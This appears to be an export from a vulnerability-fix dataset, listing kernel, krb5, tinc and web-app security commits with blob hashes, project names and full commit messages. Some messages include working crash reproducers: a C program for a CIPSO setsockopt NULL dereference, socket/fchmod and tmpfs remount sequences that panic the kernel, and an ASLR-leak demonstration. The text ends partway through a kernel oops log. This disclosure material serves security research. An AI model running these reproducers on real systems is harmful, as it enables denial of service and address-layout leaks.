Commit Message for c903f0456bc69176912dee6dd25c6a66ee1aed00:
x86/msr: Add capabilities check\n\nAt the moment the MSR driver only relies upon file system checks. This means that anything as root with any capability set can write to MSRs. Historically that wasn't very interesting but on modern processors the MSRs are such that writing to them provides several ways to execute arbitary code in kernel space. Sample code and documentation on doing this is circulating and MSR attacks are used on Windows 64bit rootkits already.\n\nIn the Linux case you still need to be able to open the device file so the impact is fairly limited and reduces the security of some capability and security model based systems down towards that of a generic "root owns the box" setup.\n\nTherefore they should require CAP_SYS_RAWIO to prevent an elevation of capabilities. The impact of this is fairly minimal on most setups because they don't have heavy use of capabilities. Those using SELinux, SMACK or AppArmor rules might want to consider if their rulesets on the MSR driver could be tighter.\n\nSigned-off-by: Alan Cox <alan@linux.intel.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: Horses <stable@kernel.org> Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    77c1090f94d1b0b5186fb13a1b71b47b1343f87f
File(s) In Commit: 
    net/core/datagram.c
Blob(s) In Commit: 
    368f9c3f9dc6505e693f56066da6dcb19ec2ebd6
Blob(s) Before Fix: 
    0337e2b768628d353936dc09ba4fe483b2c5b638
    064151a35b22136278544eba2516ac774bd7309c
    18ac112ea7ae7abeaef244b33752d1d3d9d2e460
    68bbf9f65cb08fac1ffc5a81cb6d69e76d631fae
    ae6acf6a3dead5940dba1367d9eb0ea5adfccf9c
    cb056f476126281159f1eed9216a757dbf83dc77
    e4fbfd6e2bd43a0cda49f705058631a1bfec7811
    f5b6f43a4c2e61e34e0d02053458b9a8c4dfdf89
    f82d4a34484b6ab8b399d61d1b50396687a6e98a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 77c1090f94d1b0b5186fb13a1b71b47b1343f87f:
net: fix infinite loop in __skb_recv_datagram()\n\nTommi was fuzzing with trinity and reported the following problem :\n\ncommit 3f518bf745 (datagram: Add offset argument to __skb_recv_datagram) missed that a raw socket receive queue can contain skbs with no payload.\n\nWe can loop in __skb_recv_datagram() with MSG_PEEK mode, because wait_for_packet() is not prepared to skip these skbs.\n\n[   83.541011] INFO: rcu_sched detected stalls on CPUs/tasks: {} (detected by 0, t=26002 jiffies, g=27673, c=27672, q=75) [   83.541011] INFO: Stall ended before state dump start [  108.067010] BUG: soft lockup - CPU#0 stuck for 22s! [trinity-child31:2847] ... [  108.067010] Call Trace: [  108.067010]  [<ffffffff818cc103>] __skb_recv_datagram+0x1a3/0x3b0 [  108.067010]  [<ffffffff818cc33d>] skb_recv_datagram+0x2d/0x30 [  108.067010]  [<ffffffff819ed43d>] rawv6_recvmsg+0xad/0x240 [  108.067010]  [<ffffffff818c4b04>] sock_common_recvmsg+0x34/0x50 [  108.067010]  [<ffffffff818bc8ec>] sock_recvmsg+0xbc/0xf0 [  108.067010]  [<ffffffff818bf31e>] sys_recvfrom+0xde/0x150 [  108.067010]  [<ffffffff81ca4329>] system_call_fastpath+0x16/0x1b\n\nReported-by: Tommi Rantala <tt.rantala@gmail.com> Tested-by: Tommi Rantala <tt.rantala@gmail.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Pavel Emelyanov <xemul@parallels.com> Acked-by: Pavel Emelyanov <xemul@parallels.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    027ef6c87853b0a9df53175063028edb4950d476
File(s) In Commit: 
    arch/x86/include/asm/pgtable.h
Blob(s) In Commit: 
    a1f780d45f7628a741939ba65e0f711d0fce468b
Blob(s) Before Fix: 
    18601c86fab18700c6cf7ad9a42b20d4582f769a
    1e672234c4ffd1de71117d76ccc122801fb9e9de
    49afb3f41eb622b62e910767e9967b7da4d1c153
    c3520d76820e21f8024221e5186fa1e3f3b28cb0
    fc9948465293df8dfe4e7699043f3119c6cce557
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 027ef6c87853b0a9df53175063028edb4950d476:
mm: thp: fix pmd_present for split_huge_page and PROT_NONE with THP\n\nIn many places !pmd_present has been converted to pmd_none.  For pmds that's equivalent and pmd_none is quicker so using pmd_none is better.\n\nHowever (unless we delete pmd_present) we should provide an accurate pmd_present too.  This will avoid the risk of code thinking the pmd is non present because it's under __split_huge_page_map, see the pmd_mknotpresent there and the comment above it.\n\nIf the page has been mprotected as PROT_NONE, it would also lead to a pmd_present false negative in the same way as the race with split_huge_page.\n\nBecause the PSE bit stays on at all times (both during split_huge_page and when the _PAGE_PROTNONE bit get set), we could only check for the PSE bit, but checking the PROTNONE bit too is still good to remember pmd_present must always keep PROT_NONE into account.\n\nThis explains a not reproducible BUG_ON that was seldom reported on the lists.\n\nThe same issue is in pmd_large, it would go wrong with both PROT_NONE and if it races with split_huge_page.\n\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com> Acked-by: Rik van Riel <riel@redhat.com> Cc: Johannes Weiner <jweiner@redhat.com> Cc: Hugh Dickins <hughd@google.com> Cc: Mel Gorman <mgorman@suse.de> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    89d7ae34cdda4195809a5a987f697a517a2a3177
File(s) In Commit: 
    net/ipv4/cipso_ipv4.c
Blob(s) In Commit: 
    667c1d4ca9847c627127dc633e19c7c94f354188
Blob(s) Before Fix: 
    039cc1ffe977a5cf1073f88a9826f6798ecd26e4
    05a8c0679b1ee0cba76e4054481f8cc5443ec8bd
    05b708bbdb0dedd34a04d99b16391a6b2ca4a30c
    062876b773087e009a30935a7a6bb5354f573f2d
    094e150c626033a05b87fd697cd2f2cf08a082b5
    10f8f8df01f7ed4f96e9bbe5edb2e9ef541ae5a0
    2b3c23c287cdf343670195846f68b84f6ce02d4a
    2c2a98e402e78f061523038c44c3852c962bc1b8
    3a92a76ae41d6265f957396e9ca9fd190d62b892
    40ef0801eb66b73a3edd4a194a763cba28b51575
    4322372dddbe4366cea4c2503a8d83ee869e1d4c
    4715f25dfe0351a2d219f8c2aa7756da75e51dcb
    47445331f3c641109a8fc86b81bb3eeb13fda789
    5b669ff5d59dd20457aab95949ef8bd3d12c364d
    69e77c8ff285c74a3743cd10b95cfd04a45bf687
    768d0831a6f22db973257bc8747094f9ff5d8ffc
    86f3b885b4f32c9de69cc809ba652fef0dfe9099
    a0af7ea87870a8690a03758442e40a97b7131056
    ab56a052ce31cb53e873df670a4afdc8dc68972a
    ae206163c273381ba6e8bd8a24fa050619a4a6ae
    afaa7351fd4bc68744a3351f76fbf129e9a73adb
    b6d06d6b1e6f72156db62e968e66396b8736af6f
    bc7c9662a904d4ac87d4c8e83a2fbc8ad696e26b
    bdb2a07ec363b709197435ac602b74377a600780
    c48adc565e9239a45c600d791c8f97059e22696f
    cb7c85691f8b179ea4515cc37f641e3476d2996b
    d335b6676467c90b4660eaad89e559eb451bf624
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 89d7ae34cdda4195809a5a987f697a517a2a3177:
cipso: don't follow a NULL pointer when setsockopt() is called\n\nAs reported by Alan Cox, and verified by Lin Ming, when a user attempts to add a CIPSO option to a socket using the CIPSO_V4_TAG_LOCAL tag the kernel dies a terrible death when it attempts to follow a NULL pointer (the skb argument to cipso_v4_validate() is NULL when called via the setsockopt() syscall).\n\nThis patch fixes this by first checking to ensure that the skb is non-NULL before using it to find the incoming network interface.  In the unlikely case where the skb is NULL and the user attempts to add a CIPSO option with the _TAG_LOCAL tag we return an error as this is not something we want to allow.\n\nA simple reproducer, kindly supplied by Lin Ming, although you must have the CIPSO DOI #3 configure on the system first or you will be caught early in cipso_v4_validate():\n\n	#include <sys/types.h> 	#include <sys/socket.h> 	#include <linux/ip.h> 	#include <linux/in.h> 	#include <string.h>\n\n	struct local_tag { 		char type  		char length  		char info[4]  	} \n\n	struct cipso { 		char type  		char length  		char doi[4]  		struct local_tag local  	} \n\n	int main(int argc, char **argv) 	{ 		int sockfd  		struct cipso cipso = { 			.type = IPOPT_CIPSO, 			.length = sizeof(struct cipso), 			.local = { 				.type = 128, 				.length = sizeof(struct local_tag), 			}, 		} \n\n		memset(cipso.doi, 0, 4)  		cipso.doi[3] = 3 \n\n		sockfd = socket(AF_INET, SOCK_DGRAM, 0)  		#define SOL_IP 0 		setsockopt(sockfd, SOL_IP, IP_OPTIONS, 			&cipso, sizeof(struct cipso)) \n\n		return 0  	}\n\nCC: Lin Ming <mlin@ss.pku.edu.cn> Reported-by: Alan Cox <alan@lxorguk.ukuu.org.uk> Signed-off-by: Paul Moore <pmoore@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    bd97120fc3d1a11f3124c7c9ba1d91f51829eb85
File(s) In Commit: 
    drivers/vhost/vhost.c
Blob(s) In Commit: 
    dedaf81d8f36fd89a5258d9a21fd261401f6e0d9
Blob(s) Before Fix: 
    112156f68afb2117875087447d01222d74b33ba7
    99ac2cb08b43bcb3b570969d752bff25126f298d
    c14c42b95ab8ef584a1bfb07c03154094425ed4c
    ef82a0d18489365e64a7ab0958bf01f654cfc8b1
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for bd97120fc3d1a11f3124c7c9ba1d91f51829eb85:
vhost: fix length for cross region descriptor\n\nIf a single descriptor crosses a region, the second chunk length should be decremented by size translated so far, instead it includes the full descriptor length.\n\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com> Acked-by: Jason Wang <jasowang@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a67adb997419fb53540d4a4f79c6471c60bc69b6
File(s) In Commit: 
    security/integrity/evm/evm_crypto.c
Blob(s) In Commit: 
    7dd538ef5b8319e645465eb62294158f3dbe271a
Blob(s) Before Fix: 
    49a464f5595b99f46a52da35bb331f546082b31f
    62fa2c5749867483f7669ab3a284738e6a66f84d
    8738deff26fadde6a6bf200972d0422193e4fdc9
    dfb26918699c5be5cffcfe4f37295914561096d4
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a67adb997419fb53540d4a4f79c6471c60bc69b6:
evm: checking if removexattr is not a NULL\n\nThe following lines of code produce a kernel oops.\n\nfd = socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0)  fchmod(fd, 0666) \n\n[  139.922364] BUG: unable to handle kernel NULL pointer dereference at   (null) [  139.924982] IP: [<  (null)>]   (null) [  139.924982] *pde = 00000000 [  139.924982] Oops: 0000 [#5] SMP [  139.924982] Modules linked in: fuse dm_crypt dm_mod i2c_piix4 serio_raw evdev binfmt_misc button [  139.924982] Pid: 3070, comm: acpid Tainted: G      D      3.8.0-rc2-kds+ #465 Bochs Bochs [  139.924982] EIP: 0060:[<00000000>] EFLAGS: 00010246 CPU: 0 [  139.924982] EIP is at 0x0 [  139.924982] EAX: cf5ef000 EBX: cf5ef000 ECX: c143d600 EDX: c15225f2 [  139.924982] ESI: cf4d2a1c EDI: cf4d2a1c EBP: cc02df10 ESP: cc02dee4 [  139.924982]  DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068 [  139.924982] CR0: 80050033 CR2: 00000000 CR3: 0c059000 CR4: 000006d0 [  139.924982] DR0: 00000000 DR1: 00000000 DR2: 00000000 DR3: 00000000 [  139.924982] DR6: ffff0ff0 DR7: 00000400 [  139.924982] Process acpid (pid: 3070, ti=cc02c000 task=d7705340 task.ti=cc02c000) [  139.924982] Stack: [  139.924982]  c1203c88 00000000 cc02def4 cf4d2a1c ae21eefa 471b60d5 1083c1ba c26a5940 [  139.924982]  e891fb5e 00000041 00000004 cc02df1c c1203964 00000000 cc02df4c c10e20c3 [  139.924982]  00000002 00000000 00000000 22222222 c1ff2222 cf5ef000 00000000 d76efb08 [  139.924982] Call Trace: [  139.924982]  [<c1203c88>] ? evm_update_evmxattr+0x5b/0x62 [  139.924982]  [<c1203964>] evm_inode_post_setattr+0x22/0x26 [  139.924982]  [<c10e20c3>] notify_change+0x25f/0x281 [  139.924982]  [<c10cbf56>] chmod_common+0x59/0x76 [  139.924982]  [<c10e27a1>] ? put_unused_fd+0x33/0x33 [  139.924982]  [<c10cca09>] sys_fchmod+0x39/0x5c [  139.924982]  [<c13f4f30>] syscall_call+0x7/0xb [  139.924982] Code:  Bad EIP value.\n\nThis happens because sockets do not define the removexattr operation. Before removing the xattr, verify the removexattr function pointer is not NULL.\n\nSigned-off-by: Dmitry Kasatkin <dmitry.kasatkin@intel.com> Signed-off-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    0a9ab9bdb3e891762553f667066190c1d22ad62b
File(s) In Commit: 
    net/bluetooth/hidp/core.c
Blob(s) In Commit: 
    a7352ff3fd1e7884c2fc43142fba9bc0033063b8
Blob(s) Before Fix: 
    03652f383b175668f89ca0a11aa2bcdfa5bad8de
    04f77842eb1837128ea7a1d6a9ad5d2e91b467a7
    06f11971d64368d134f11f30dc2d27716b4e694d
    075a3e920caffcbd44ff2f5a1e9e6ab4cc560e45
    0c0028463fa3479f5448053772b14fe11360fa49
    2c20d765b394841bf878c331b4f7c69a897e6e28
    43b4c2deb7cc05bdc875e3f7b23a999468f5c1a4
    450eb0244bbf6080b24142b4c9686bce948cf2fe
    b2bcbe2dc328ba8473227035c39a7ff467ee5659
    bfe641b7dfaf0e0ba70fa604ebffec7155cbaec8
    c699c5706c0a80814a7e75f2cf5decb1c81e09b0
    ccd985da65180656d7df83a986655c4b82258220
    d478be11d562995ae08c65bc8198c187ee686d61
    fb68f344c34a68e5a4334b751196680ac33ffdfe
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0a9ab9bdb3e891762553f667066190c1d22ad62b:
Bluetooth: Fix incorrect strncpy() in hidp_setup_hid()\n\nThe length parameter should be sizeof(req->name) - 1 because there is no guarantee that string provided by userspace will contain the trailing '\0'.\n\nCan be easily reproduced by manually setting req->name to 128 non-zero bytes prior to ioctl(HIDPCONNADD) and checking the device name setup on input subsystem:\n\n$ cat /sys/devices/pnp0/00\:04/tty/ttyS0/hci0/hci0\:1/input8/name AAAAAA[...]AAAAAAAAf0:af:f0:af:f0:af\n\n("f0:af:f0:af:f0:af" is the device bluetooth address, taken from "phys" field in struct hid_device due to overflow.)\n\nCc: stable@vger.kernel.org Signed-off-by: Anderson Lizardo <anderson.lizardo@openbossa.org> Acked-by: Marcel Holtmann <marcel@holtmann.org> Signed-off-by: Gustavo Padovan <gustavo.padovan@collabora.co.uk>

======================================================================
Commit With Fix: 
    40f1b4a5749a621cd27c5ca39900dbcf8701969d
File(s) In Commit: 
    include/tool/editing_page.php
Blob(s) In Commit: 
    f5dc3f15ea26690343ceddd4e09805bc9729460c
Blob(s) Before Fix: 
    20a3551ff740413bf99fe91d072e776c202d0cea
Projects:
    1008k_gpEasy-CMS
Commit Message for 40f1b4a5749a621cd27c5ca39900dbcf8701969d:
new_section vulnerability fixed

======================================================================
Commit With Fix: 
    2ca39528c01a933f6689cd6505ce65bd6d68a530
File(s) In Commit: 
    kernel/signal.c
Blob(s) In Commit: 
    43b0d4a1b7bace76e2dac9a87e2a2f6ab5efdf3e
Blob(s) Before Fix: 
    d63c79e7e41598d0ac2e92fcb6860ab33ddc2f1e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2ca39528c01a933f6689cd6505ce65bd6d68a530:
signal: always clear sa_restorer on execve\n\nWhen the new signal handlers are set up, the location of sa_restorer is not cleared, leaking a parent process's address space location to children.  This allows for a potential bypass of the parent's ASLR by examining the sa_restorer value returned when calling sigaction().\n\nBased on what should be considered "secret" about addresses, it only matters across the exec not the fork (since the VMAs haven't changed until the exec).  But since exec sets SIG_DFL and keeps sa_restorer, this is where it should be fixed.\n\nGiven the few uses of sa_restorer, a "set" function was not written since this would be the only use.  Instead, we use __ARCH_HAS_SA_RESTORER, as already done in other places.\n\nExample of the leak before applying this patch:\n\n  $ cat /proc/$$/maps   ...   7fb9f3083000-7fb9f3238000 r-xp 00000000 fd:01 404469 .../libc-2.15.so   ...   $ ./leak   ...   7f278bc74000-7f278be29000 r-xp 00000000 fd:01 404469 .../libc-2.15.so   ...   1 0 (nil) 0x7fb9f30b94a0   2 4000000 (nil) 0x7f278bcaa4a0   3 4000000 (nil) 0x7f278bcaa4a0   4 0 (nil) 0x7fb9f30b94a0   ...\n\n[akpm@linux-foundation.org: use SA_RESTORER for backportability] Signed-off-by: Kees Cook <keescook@chromium.org> Reported-by: Emese Revfy <re.emese@gmail.com> Cc: Emese Revfy <re.emese@gmail.com> Cc: PaX Team <pageexec@freemail.hu> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Oleg Nesterov <oleg@redhat.com> Cc: "Eric W. Biederman" <ebiederm@xmission.com> Cc: Serge Hallyn <serge.hallyn@canonical.com> Cc: Julien Tinnes <jln@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    f249555301940c6df3a2cdda13b56b5674eebc2e
File(s) In Commit: 
    src/plugins/preauth/pkinit/pkinit_crypto_openssl.c
Blob(s) In Commit: 
    390797a9c26cf8c44c19a7d0a92abe2d8172a717
Blob(s) Before Fix: 
    17c37c66bb32f0e861c42b5c115c4d36a60bc026
    8f2ffbdf33ded30e3d95d8fb12b78d4427c5a3b8
Projects:
    3van_krb5
Commit Message for f249555301940c6df3a2cdda13b56b5674eebc2e:
PKINIT null pointer deref [CVE-2013-1415]\n\nDon't dereference a null pointer when cleaning up.\n\nThe KDC plugin for PKINIT can dereference a null pointer when a malformed packet causes processing to terminate early, leading to a crash of the KDC process.  An attacker would need to have a valid PKINIT certificate or have observed a successful PKINIT authentication, or an unauthenticated attacker could execute the attack if anonymous PKINIT is enabled.\n\nCVSSv2 vector: AV:N/AC:M/Au:N/C:N/I:N/A:C/E:P/RL:O/RC:C\n\nThis is a minimal commit for pullup  style fixes in a followup. [kaduk@mit.edu: reformat and edit commit message]\n\n(cherry picked from commit c773d3c775e9b2d88bcdff5f8a8ba88d7ec4e8ed)\n\nticket: 7570 version_fixed: 1.11.1 status: resolved

======================================================================
Commit With Fix: 
    8ee70ec63931d1e38567905387ab9b1d45734d81
File(s) In Commit: 
    src/kdc/do_tgs_req.c
Blob(s) In Commit: 
    86496e94911f45c6802a8cae71affd0b0d001dab
Blob(s) Before Fix: 
    9ff80cfd0eca1de4af8b31614e688215b6bf35ce
Projects:
    3van_krb5
Commit Message for 8ee70ec63931d1e38567905387ab9b1d45734d81:
KDC TGS-REQ null deref [CVE-2013-1416]\n\nBy sending an unusual but valid TGS-REQ, an authenticated remote attacker can cause the KDC process to crash by dereferencing a null pointer.\n\nprep_reprocess_req() can cause a null pointer dereference when processing a service principal name.  Code in this function can inappropriately pass a null pointer to strlcpy().  Unmodified client software can trivially trigger this vulnerability, but the attacker must have already authenticated and received a valid Kerberos ticket.\n\nThe vulnerable code was introduced by the implementation of new service principal realm referral functionality in krb5-1.7, but was corrected as a side effect of the KDC refactoring in krb5-1.11.\n\nCVSSv2 vector: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:H/RL:O/RC:C\n\nticket: 7600 (new) version_fixed: 1.10.5 status: resolved

======================================================================
Commit With Fix: 
    4c023ba43c16396f0d199e2df1cfa59b88b62acc
File(s) In Commit: 
    src/kdc/do_tgs_req.c
Blob(s) In Commit: 
    745a48e98449c6a298eb1c4190e3e661dd5e4813
Blob(s) Before Fix: 
    d41bc5d4eed848f702c98efaaa1bc3cff975a4ca
Projects:
    3van_krb5
Commit Message for 4c023ba43c16396f0d199e2df1cfa59b88b62acc:
KDC null deref due to referrals [CVE-2013-1417]\n\nAn authenticated remote client can cause a KDC to crash by making a valid TGS-REQ to a KDC serving a realm with a single-component name. The process_tgs_req() function dereferences a null pointer because an unusual failure condition causes a helper function to return success.\n\nWhile attempting to provide cross-realm referrals for host-based service principals, the find_referral_tgs() function could return a TGS principal for a zero-length realm name (indicating that the hostname in the service principal has no known realm associated with it).\n\nSubsequently, the find_alternate_tgs() function would attempt to construct a path to this empty-string realm, and return success along with a null pointer in its output parameter.  This happens because krb5_walk_realm_tree() returns a list of length one when it attempts to construct a transit path between a single-component realm and the empty-string realm.  This list causes a loop in find_alternate_tgs() to iterate over zero elements, resulting in the unexpected output of a null pointer, which process_tgs_req() proceeds to dereference because there is no error condition.\n\nAdd an error condition to find_referral_tgs() when krb5_get_host_realm() returns an empty realm name.  Also add an error condition to find_alternate_tgs() to handle the length-one output from krb5_walk_realm_tree().\n\nThe vulnerable configuration is not likely to arise in practice. (Realm names that have a single component are likely to be test realms.)  Releases prior to krb5-1.11 are not vulnerable.\n\nThanks to Sol Jerome for reporting this problem.\n\nCVSSv2: AV:N/AC:M/Au:S/C:N/I:N/A:P/E:H/RL:O/RC:C\n\n(cherry picked from commit 3c7f1c21ffaaf6c90f1045f0f5440303c766acc0)\n\nticket: 7668 version_fixed: 1.11.4 status: resolved

======================================================================
Commit With Fix: 
    c2ccf4197f697c4ff143b8a786acdd875e70a89d
File(s) In Commit: 
    src/kdc/main.c
Blob(s) In Commit: 
    71606079659c1ae940d74770850e4ccfbc9d2f92
Blob(s) Before Fix: 
    b56ec193ca3fb0be4707b287e2d89ce94cbdd15f
Projects:
    3van_krb5
Commit Message for c2ccf4197f697c4ff143b8a786acdd875e70a89d:
Multi-realm KDC null deref [CVE-2013-1418]\n\nIf a KDC serves multiple realms, certain requests can cause setup_server_realm() to dereference a null pointer, crashing the KDC.\n\nCVSSv2: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:C\n\nA related but more minor vulnerability requires authentication to exploit, and is only present if a third-party KDC database module can dereference a null pointer under certain conditions.\n\n(back ported from commit 5d2d9a1abe46a2c1a8614d4672d08d9d30a5f8bf)\n\nticket: 7757 (new) version_fixed: 1.10.7 status: resolved

======================================================================
Commit With Fix: 
    17a33dfd95b1a29e90db76414eb9622df9632320
File(s) In Commit: 
    src/net_packet.c
Blob(s) In Commit: 
    054679e9aa0c75bca437e96443336a21d7ee53e4
Blob(s) Before Fix: 
    1efc60dd76b4455660b79ea3ee8d24e228380c14
    cd8d98ac0b94cb602a738752f771cfa1d6102af2
Projects:
    2898594211_tinc
Commit Message for 17a33dfd95b1a29e90db76414eb9622df9632320:
Drop packets forwarded via TCP if they are too big (CVE-2013-1428).\n\nNormally all requests sent via the meta connections are checked so that they cannot be larger than the input buffer. However, when packets are forwarded via meta connections, they are copied into a packet buffer without checking whether it fits into it. Since the packet buffer is allocated on the stack, this in effect allows an authenticated remote node to cause a stack overflow.\n\nThis issue was found by Martin Schobert.

======================================================================
Commit With Fix: 
    7d58f870e8edc6597485dd1b80ea9fb78580190c
File(s) In Commit: 
    upload/index.php
Blob(s) In Commit: 
    dcb0ae374ca232f8092866422a86ef80be93de94
Blob(s) Before Fix: 
    431285996d2a7c88e2edbb2f85b1805a584452a6
    e504a22fd709dd69f49a25dd717e2cd6777e27a1
Projects:
    diversen_gallery
Commit Message for 7d58f870e8edc6597485dd1b80ea9fb78580190c:
escape possible shell args

======================================================================
Commit With Fix: 
    a8775aacf9e5c81cf11bec34b7afa7f27ddfe277
File(s) In Commit: 
    README.md
Blob(s) In Commit: 
    01d2c6ef35778884246227bca3ca909f3e345c6d
Blob(s) Before Fix: 
    0769d966441a090002c2a9a05fd2726bd26205d6
Projects:
    4moms_dragonfly
Commit Message for a8775aacf9e5c81cf11bec34b7afa7f27ddfe277:
security update note

======================================================================
Commit With Fix: 
    6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0
File(s) In Commit: 
    net/core/sock_diag.c
Blob(s) In Commit: 
    750f44f3aa3117b578af1377ff07abb79032a612
Blob(s) Before Fix: 
    5fd146720f395ff91e85c3ab5ae7f4d543a5e75e
    602cd637182ebb321af6773d2ccfe9a8945d44c5
    a29e90cf36b75af6fd894494253cb6af554039c1
    a2ad3204a90341e0f506443c4ebd8c4374f7c916
    f9f7ae9a7d55d564b3f248d1d3a60da1986f764e
    ffbaac36d83ccf25811eff86bab3a2ece51348e3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0:
sock_diag: Fix out-of-bounds access to sock_diag_handlers[]\n\nUserland can send a netlink message requesting SOCK_DIAG_BY_FAMILY with a family greater or equal then AF_MAX -- the array size of sock_diag_handlers[]. The current code does not test for this condition therefore is vulnerable to an out-of-bound access opening doors for a privilege escalation.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    5f00110f7273f9ff04ac69a5f85bb535a4fd0987
File(s) In Commit: 
    mm/shmem.c
Blob(s) In Commit: 
    5e2ff592e3b89d41640b3ff9c69d25d0fe004be4
Blob(s) Before Fix: 
    7162c58355b135fb992f6883125da57f300576f1
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 5f00110f7273f9ff04ac69a5f85bb535a4fd0987:
tmpfs: fix use-after-free of mempolicy object\n\nThe tmpfs remount logic preserves filesystem mempolicy if the mpol=M option is not specified in the remount request.  A new policy can be specified if mpol=M is given.\n\nBefore this patch remounting an mpol bound tmpfs without specifying mpol= mount option in the remount request would set the filesystem's mempolicy object to a freed mempolicy object.\n\nTo reproduce the problem boot a DEBUG_PAGEALLOC kernel and run:     # mkdir /tmp/x\n\n    # mount -t tmpfs -o size=100M,mpol=interleave nodev /tmp/x\n\n    # grep /tmp/x /proc/mounts     nodev /tmp/x tmpfs rw,relatime,size=102400k,mpol=interleave:0-3 0 0\n\n    # mount -o remount,size=200M nodev /tmp/x\n\n    # grep /tmp/x /proc/mounts     nodev /tmp/x tmpfs rw,relatime,size=204800k,mpol=??? 0 0         # note ? garbage in mpol=... output above\n\n    # dd if=/dev/zero of=/tmp/x/f count=1         # panic here\n\nPanic:     BUG: unable to handle kernel NULL pointer dereference at           (null)     IP: [<          (null)>]           (null)     [...]     Oops: 0010 [#1] SMP DEBUG_PAGEALLOC     Call Trace:       mpol_shared_policy_init+0xa5/0x160       shmem_get_inode+0x209/0x270       shmem_mknod+0x3e/0xf0       shmem_create+0x18/0x20       vfs_create+0xb5/0x130       do_last+0x9a1/0xea0       path_openat+0xb3/0x4d0       do_filp_open+0x42/0xa0       do_sys_open+0xfe/0x1e0       compat_sys_open+0x1b/0x20       cstar_dispatch+0x7/0x1f\n\nNon-debug kernels will not crash immediately because referencing the dangling mpol will not cause a fault.  Instead the filesystem will reference a freed mempolicy object, which will cause unpredictable behavior.\n\nThe problem boils down to a dropped mpol reference below if shmem_parse_options() does not allocate a new mpol:\n\n    config = *sbinfo     shmem_parse_options(data, &config, true)     mpol_put(sbinfo->mpol)     sbinfo->mpol = config.mpol  /* BUG: saves unreferenced mpol */\n\nThis patch avoids the crash by not releasing the mempolicy if shmem_parse_options() doesn't create a new mpol.\n\nHow far back does this issue go? I see it in both 2.6.36 and 3.3.  I did not look back further.\n\nSigned-off-by: Greg Thelen <gthelen@google.com> Acked-by: Hugh Dickins <hughd@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    1ee0a224bc9aad1de496c795f96bc6ba2c394811
File(s) In Commit: 
    drivers/usb/serial/io_ti.c
Blob(s) In Commit: 
    82afc4d6a327d6bdbebc4707507684c966f11f9f
Blob(s) Before Fix: 
    0aac00afb5c8212403466a3ede7a49b78f63a2e7
    1db782da94a578f2e38d8050e3ff6aac2c82a397
    22506b095c4f6e691ea60ae7cf2e0bf5d2593004
    3936904c641969cd4566ba88ee5dc39d8912e6b9
    40a95a7fe3837b04aa629eb9d1376799d9e71fc9
    58184f3de6867bfa9ebbbc6d6afbe074d80a8f12
    60023c2d2a317008d7aab0c78bd5120f77b1597c
    a2209cd4509396d3827d4a0627c59f42b5d713be
    ed83e7a1da2ec0f92cd3496a77d22ff2ab7c13bd
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1ee0a224bc9aad1de496c795f96bc6ba2c394811:
USB: io_ti: Fix NULL dereference in chase_port()\n\nThe tty is NULL when the port is hanging up. chase_port() needs to check for this.\n\nThis patch is intended for stable series. The behavior was observed and tested in Linux 3.2 and 3.7.1.\n\nJohan Hovold submitted a more elaborate patch for the mainline kernel.\n\n[   56.277883] usb 1-1: edge_bulk_in_callback - nonzero read bulk status received: -84 [   56.278811] usb 1-1: USB disconnect, device number 3 [   56.278856] usb 1-1: edge_bulk_in_callback - stopping read! [   56.279562] BUG: unable to handle kernel NULL pointer dereference at 00000000000001c8 [   56.280536] IP: [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19/0x35 [   56.281212] PGD 1dc1b067 PUD 1e0f7067 PMD 0 [   56.282085] Oops: 0002 [#1] SMP [   56.282744] Modules linked in: [   56.283512] CPU 1 [   56.283512] Pid: 25, comm: khubd Not tainted 3.7.1 #1 innotek GmbH VirtualBox/VirtualBox [   56.283512] RIP: 0010:[<ffffffff8144e62a>]  [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19/0x35 [   56.283512] RSP: 0018:ffff88001fa99ab0  EFLAGS: 00010046 [   56.283512] RAX: 0000000000000046 RBX: 00000000000001c8 RCX: 0000000000640064 [   56.283512] 